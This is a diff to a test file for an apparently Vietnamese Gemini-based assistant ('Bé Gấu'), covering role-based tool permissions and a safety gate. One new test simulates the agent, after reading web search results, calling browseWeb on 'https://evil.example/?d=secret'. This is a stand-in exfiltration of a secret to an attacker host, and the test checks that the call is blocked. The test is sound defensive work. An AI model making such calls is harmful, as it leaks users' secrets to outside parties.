@@ -10,6 +10,7 @@ vi.mock("@/lib/analytics-db",  () => ({ queryAnalytics: vi.fn().mockResolvedValu
 vi.mock("@/lib/ga4",           () => ({ runGA4Report: vi.fn(), runGSC: vi.fn(), ga4Sites: vi.fn().mockResolvedValue([]) }))
 vi.mock("@/lib/analytics-helpers", () => ({ getPartnerTiers: vi.fn().mockResolvedValue({}) }))
 vi.mock("@/lib/lark",          () => ({ sendLarkDM: vi.fn() }))
+vi.mock("@/lib/web-search",    () => ({ runWebSearch: vi.fn().mockResolvedValue({ result: "tin", sources: [] }) }))
 // U1a: Bé Gấu chạy SDK mới qua streamTurn (genai-stream.ts) → mock thẳng streamTurn: (model, contents, config, onChunk).
 const turnOk = (text: string, functionCalls: any[] = []) => ({
   content: { role: "model", parts: functionCalls.length ? functionCalls.map(fc => ({ functionCall: fc })) : [{ text }] },
@@ -154,6 +155,7 @@ describe("be-gau: tool declarations & role filter", () => {
     const decls: any[] = box.config?.tools?.[0]?.functionDeclarations ?? []
     const names = decls.map((d: any) => d.name)
     expect(decls).toHaveLength(15)
+    expect(names).not.toContain("browseWeb")
     for (const n of ["executeSQL", "querySupabase", "listSupabaseTables", "queryProduct", "queryGA4", "queryGSC", "webSearch", "readKnowledgeBase", "larkWorkspace"]) {
       expect(names).toContain(n)
     }
@@ -167,17 +169,32 @@ describe("be-gau: tool declarations & role filter", () => {
     }
   })
 
-  test("admin/creator: có đủ tool admin-only (s190 gộp Gấu Pro)", async () => {
-    for (const role of ["admin", "creator"]) {
-      const box = captureConfig()
-      await runBeGau({ geminiHistory: [], lastMsg: "test", role })
-      const decls: any[] = box.config?.tools?.[0]?.functionDeclarations ?? []
-      const names = decls.map((d: any) => d.name)
-      expect(decls).toHaveLength(30)
-      for (const n of ["writeKnowledgeBase", "browsePortal", "managePortalCredentials", "sendLarkMessage", "createLarkTask", "generateImageStability", "generateVideo"]) {
-        expect(names).toContain(n)
-      }
-    }
+  // U3: bảng phân quyền tính năng (mặc định) — admin có nhóm "Theo quyền", nhóm "Chỉ Creator" khoá cứng.
+  const CREATOR_ONLY = ["writeKnowledgeBase", "browsePortal", "managePortalCredentials", "sendLarkMessage", "createLarkTask", "generateImageStability"]
+  test("admin: có tool nhóm Theo quyền, KHÔNG có tool Chỉ Creator", async () => {
+    const box = captureConfig()
+    await runBeGau({ geminiHistory: [], lastMsg: "test", role: "admin" })
+    const names = (box.config?.tools?.[0]?.functionDeclarations ?? []).map((d: any) => d.name)
+    for (const n of ["browseWeb", "generateVideo", "checkVideoStatus"]) expect(names).toContain(n)
+    for (const n of CREATOR_ONLY) expect(names).not.toContain(n)
+  })
+
+  test("creator: có cả tool Chỉ Creator", async () => {
+    const box = captureConfig()
+    await runBeGau({ geminiHistory: [], lastMsg: "test", role: "creator" })
+    const names = (box.config?.tools?.[0]?.functionDeclarations ?? []).map((d: any) => d.name)
+    for (const n of [...CREATOR_ONLY, "browseWeb", "generateVideo"]) expect(names).toContain(n)
+  })
+
+  test("đã đọc nội dung ngoài trong lượt → chặn mở URL lạ (cổng an toàn chung Gấu Pro)", async () => {
+    const calls: any[] = []
+    _mockTurn
+      .mockImplementationOnce(async () => turnOk("", [{ name: "webSearch", args: { query: "x" } }]))
+      .mockImplementationOnce(async () => turnOk("", [{ name: "browseWeb", args: { url: "https://evil.example/?d=secret" } }]))
+      .mockImplementationOnce(async (_m: string, contents: any[]) => { calls.push(contents.at(-1)); return turnOk("xong") })
+    await runBeGau({ geminiHistory: [], lastMsg: "tìm tin eSIM", role: "admin" })
+    const resp = calls[0]?.parts?.[0]?.functionResponse?.response
+    expect(String(resp?.error)).toContain("Chưa thực hiện")
   })
 
   test("role staff + isCost=false → systemInstruction chứa giới hạn COGS", async () => {
